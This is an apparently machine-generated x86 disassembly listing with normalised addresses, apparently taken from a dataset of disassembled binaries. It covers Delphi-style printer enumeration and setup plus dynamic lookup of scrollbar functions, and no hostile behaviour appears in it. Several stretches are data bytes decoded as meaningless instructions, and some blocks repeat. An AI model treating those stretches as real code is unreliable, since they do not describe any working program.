adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add ah ah
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x100042e5 ] dh
jb r-xdata
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
in al 0xe6
inc edx
imul esi [ ebx + ecx + 0x70 ] 0x6e614c6f
jae r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
pop ebp
jb r-xdata
imul ebp [ esi + 0x74 ] 0x8b737265
rcr ah 0xe4
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
in al 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
adc [ eax ] al
popad
jo r-xdata
call sub_404174
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
sbb [ eax ] al
add [ eax ] al
or [ eax + edx * 2 + 0x72 ] dl
imul ebp [ esi + 0x74 ] 0x56907265
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
or [ eax + 0x72 ] dl
mov eax edi
pop edi
pop esi
pop ebx
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42e697
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404174
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404388
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404174
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404174
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_403550
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e69e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404388
je r-xdata
sub_42e4f8
push esi
mov esi [ eax ]
cmp [ eax ] 0x0
je r-xdata
mov eax esi
pop esi
retn
mov edx [ eax ]
jmp r-xdata
cmp [ edx ] 0x20
je r-xdata
inc edx
mov esi edx
jmp r-xdata
mov cl [ edx ]
test cl cl
je r-xdata
cmp [ edx ] 0x2c
jne r-xdata
cmp cl 0x2c
jne r-xdata
mov [ eax ] edx
mov [ edx ] 0x0
inc edx
inc edx
sub_42e548
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
nop
in eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x100042e5 ] dh
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
push cs
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
adc [ eax ] al
add al 0x0
add [ eax ] al
in al 0x10
inc eax
add [ eax ] cl
add [ eax ] al
add ah ah
adc [ eax ] al
or al 0x0
add [ eax ] al
push cs
push esp
push eax
jb r-xdata
retn 0x8
outsb
je r-xdata
pop ebp
jb r-xdata
call sub_404174
mov eax edi
test bl bl
je r-xdata
jbe r-xdata
mov eax edi
pop edi
pop esi
pop ebx
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
add [ edx ] ch
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42e697
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404174
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404388
jne r-xdata
arpl [ ebp - 0x73 ] sp
inc eax
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
push edi
test dl dl
je r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404174
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404174
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
add esp 0xfffffff0
call sub_403550
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e69e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404388
je r-xdata
sub_42e5c4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4031bc
lea eax [ edi + 0x4 ]
mov edx esi
call sub_404174
lea eax [ edi + 0x8 ]
mov edx [ ebp + 0xc ]
call sub_404174
lea eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42e624
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov ebx eax
xor eax eax
push ebp
push sub_42e697
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx esi
call sub_404174
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x8 ]
call sub_404388
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e69e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
mov al 0x1
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404174
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0xc ]
call sub_404388
je r-xdata
sub_42e6a8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031bc
mov [ esi + 0x14 ] 0xffffffff
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_42e6e4
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
cmp [ esi + 0x1c ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_42e760
mov eax esi
call sub_42f168
mov eax esi
call sub_42f1a4
mov eax [ esi + 0x4 ]
call sub_4031ec
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
mov eax esi
call sub_42e8fc
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call ClosePrinter
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
push eax
call GlobalUnlock
mov eax [ esi + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ esi + 0x28 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_42e760
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_42e87e
push [ fs : eax ]
mov [ fs : eax ] esp
mov al [ esi + 0x1f ]
cmp bl al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e885
lea eax [ ebp - 0x8 ]
call sub_403f7c
retn
xor edi edi
mov edx ebx
sub dl 0x1
jb r-xdata
xor edx edx
mov eax esi
call sub_42e88c
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
je r-xdata
mov eax [ esi + 0x20 ]
push eax
call DeleteDC
xor eax eax
mov [ esi + 0x20 ] eax
jmp r-xdata
xor edx edx
call sub_4257b8
cmp al 0x2
je r-xdata
dec dl
je r-xdata
test edi edi
je r-xdata
mov edi CreateICA
jmp r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov [ esi + 0x1f ] bl
mov eax esi
call sub_42ed10
push eax
mov eax esi
call sub_42ed28
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_40443c
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40443c
push eax
call edi
mov [ esi + 0x20 ] eax
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
xor edx edx
call sub_4257b8
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x8 ]
call sub_42e52c
mov edi CreateDCA
push eax
call DeleteDC
mov edx [ esi + 0x20 ]
call sub_4257b8
sub_42e88c
push ebp
mov ebp esp
push 0x0
push 0x0
xor ecx ecx
push ebp
push sub_42e8f1
push [ fs : ecx ]
mov [ fs : ecx ] esp
cmp dl [ eax + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42e8f8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fa0
retn
test dl dl
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x8 ]
call sub_42e52c
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_42e52c
jmp r-xdata
sub_42e8fc
push ebx
mov ebx eax
mov dl 0x1
mov eax ebx
call sub_42e88c
mov eax [ ebx + 0x20 ]
push eax
call EndPage
cmp [ ebx + 0x1d ] 0x0
jne r-xdata
mov [ ebx + 0x1c ] 0x0
mov [ ebx + 0x1d ] 0x0
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
mov eax [ ebx + 0x20 ]
push eax
call EndDoc
sub_42e930
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_42ed10
push eax
mov eax ebx
call sub_42ed28
pop edx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov esi eax
mov eax [ esi + 0x8 ]
call sub_40443c
mov edx eax
mov eax edi
call sub_4089a4
mov eax [ esi + 0x4 ]
call sub_40443c
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_4089a4
mov eax [ esi + 0xc ]
call sub_40443c
mov edx eax
mov eax [ ebp + 0xc ]
call sub_4089a4
mov eax [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
mov [ eax ] edx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42e99c
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ r-xdata ]
mov [ ebx + 0x1e ] al
test esi 0x1
je r-xdata
test esi 0x100
je r-xdata
or [ ebx + 0x1e ] 0x2
test esi 0x8000
je r-xdata
or [ ebx + 0x1e ] 0x1
pop esi
pop ebx
retn
or [ ebx + 0x1e ] 0x4
sub_42e9d8
push ebp
mov ebp esp
add esp 0xffffff3c
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xb0 ] ebx
mov [ ebp - 0xb4 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_42ec0f
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42e88c
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
test eax eax
je r-xdata
mov eax ebx
call sub_42f1a4
mov eax [ ebx + 0x2c ]
test eax eax
je r-xdata
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
mov edx [ edi + 0x28 ]
mov eax ebx
call sub_42e99c
mov [ ebx + 0x28 ] esi
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor edx edx
mov eax ebx
call sub_42e760
mov [ ebp - 0xc ] 0xffffffff
mov eax ebx
call sub_42ed28
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
push eax
call ClosePrinter
xor eax eax
mov [ ebx + 0x2c ] eax
cmp [ ebp - 0xc ] 0xffffffff
jne r-xdata
inc edi
xor esi esi
mov eax [ ebp - 0xc ]
mov [ ebx + 0x14 ] eax
push 0x0
lea eax [ ebx + 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call OpenPrinterA
test eax eax
je r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e5c4
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0xb4 ]
mov edx [ ebp - 0x4 ]
mov [ ebp - 0xc4 ] edx
mov [ ebp - 0xc0 ] 0x6
mov edx [ ebp + 0xc ]
mov [ ebp - 0xbc ] edx
mov [ ebp - 0xb8 ] 0x6
lea edx [ ebp - 0xc4 ]
mov ecx 0x1
call sub_409070
mov edx [ ebp - 0xb0 ]
mov eax [ ebx + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
add eax 0xc
mov edx [ ebp + 0xc ]
call sub_404174
mov [ ebp - 0xc ] esi
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec16
lea eax [ ebp - 0xb4 ]
mov edx 0x2
call sub_403fa0
retn
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov edx esi
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_42e624
test al al
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0xac ]
push eax
lea eax [ ebp - 0xac ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
push eax
push 0x42
call GlobalAlloc
mov esi eax
mov [ ebx + 0x28 ] esi
test esi esi
je r-xdata
mov eax [ ebx + 0x24 ]
mov edx [ eax + 0x28 ]
mov eax ebx
call sub_42e99c
push esi
call GlobalLock
mov edi eax
mov [ ebx + 0x24 ] edi
push 0x2
push edi
push edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
push 0x0
call DocumentPropertiesA
test eax eax
jge r-xdata
mov eax [ ebx + 0x28 ]
push eax
call GlobalUnlock
mov eax [ ebx + 0x28 ]
push eax
call GlobalFree
xor eax eax
mov [ ebx + 0x28 ] eax
sub_42ec34
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_42ec8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_42ed10
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
movsx eax [ eax + 0x36 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ec92
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_42e52c
sub_42ec98
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_42ed02
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_42e88c
mov eax ebx
call sub_42ed10
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
xor edx edx
mov eax ebx
call sub_42e760
mov eax [ ebx + 0x24 ]
mov [ eax + 0x36 ] si
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ed09
lea eax [ ebp - 0x4 ]
call sub_403f7c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x4 ]
call sub_42e52c
sub_42ed28
push ebp
mov ebp esp
add esp 0xffffffc8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42ef57
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031bc
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] ebx
mov edi ebx
xor edx edx
push ebp
push sub_42ef14
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov esi 0x2
mov bl 0x5
mov esi 0x6
mov bl 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
call sub_40276c
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_42ef03
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0xc ]
push eax
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x0
xor eax eax
mov al bl
push eax
push 0x0
push esi
call EnumPrintersA
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x18 ]
dec eax
test eax eax
jl r-xdata
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ef5e
lea eax [ ebp - 0x28 ]
mov edx 0x3
call sub_403fa0
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_40278c
retn
inc eax
mov [ ebp - 0x1c ] eax
mov esi [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
call sub_42e4f8
mov edi eax
jmp r-xdata
mov esi [ ebp - 0x10 ]
mov edi [ esi ]
push edi
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e5c4
push eax
lea eax [ ebp - 0x20 ]
mov edx edi
call sub_404174
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov esi [ eax ]
call [ esi + 0x3c ]
add [ ebp - 0x10 ] 0xc
jmp r-xdata
cmp [ edi ] 0x0
jne r-xdata
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ esi ]
push eax
push edi
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e5c4
push eax
lea eax [ ebp - 0x24 ]
push eax
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x28 ]
mov edx [ esi ]
mov [ ebp - 0x38 ] edx
mov [ ebp - 0x34 ] 0x6
mov [ ebp - 0x30 ] edi
mov [ ebp - 0x2c ] 0x6
lea edx [ ebp - 0x38 ]
mov ecx 0x1
call sub_409070
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
pop ecx
mov edi [ eax ]
call [ edi + 0x3c ]
lea eax [ ebp - 0x8 ]
call sub_42e4f8
mov edi eax
add [ ebp - 0x10 ] 0x14
cmp bl 0x4
jne r-xdata
sub_42ef68
push ebp
mov ebp esp
add esp 0xfffffbdc
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x424 ] edx
mov [ ebp - 0x420 ] edx
mov [ ebp - 0x41c ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42f145
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x0
push 0x5
push 0x0
push 0x1
call EnumPrintersA
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
call sub_407e1c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42f105
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x5
push 0x0
push 0x1
call EnumPrintersA
cmp [ ebp - 0xc ] 0x0
jbe r-xdata
call GetLastError
cmp eax 0x7a
je r-xdata
push 0x3ff
lea eax [ ebp - 0x418 ]
push eax
push r-xdata
push r-xdata
push r-xdata
call GetProfileStringA
lea eax [ ebp - 0x418 ]
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x10 ]
call sub_42e4f8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x18 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
jmp r-xdata
call GetLastError
cmp eax 0x7b
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_40278c
retn
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_42ed28
mov edi eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
call sub_40cfdc
lea edx [ ebp - 0x41c ]
mov eax [ rw-data ]
call sub_405d64
mov eax [ ebp - 0x41c ]
call sub_42e52c
jmp r-xdata
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_40443c
push eax
push 0x0
mov eax [ ebx + 0x4 ]
call sub_40443c
push eax
mov eax [ ebx + 0x8 ]
call sub_40443c
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_42e9d8
call sub_403a64
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x420 ]
mov edx [ ebp - 0x14 ]
call sub_404174
mov edx [ ebp - 0x420 ]
pop eax
call sub_408084
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f14c
lea eax [ ebp - 0x424 ]
mov edx 0x3
call sub_403fa0
retn
sub_42f168
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x10 ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
test eax eax
jl r-xdata
lea eax [ esi + 0x10 ]
call sub_40d538
inc eax
mov ebx eax
xor edi edi
mov edx edi
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_4031ec
inc edi
dec ebx
jne r-xdata
sub_42f1d0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f201
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f208
retn
mov eax [ rw-data ]
call sub_4031ec
sub_42f214
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_42f248
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_42f270
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_42f4f2
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42f519
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42f520
retn
sub_42f534
xor ch 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40042f5 ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
add dh dh
inc edx
add [ esi + esi * 8 ] al
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x1c ] si
cmc
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
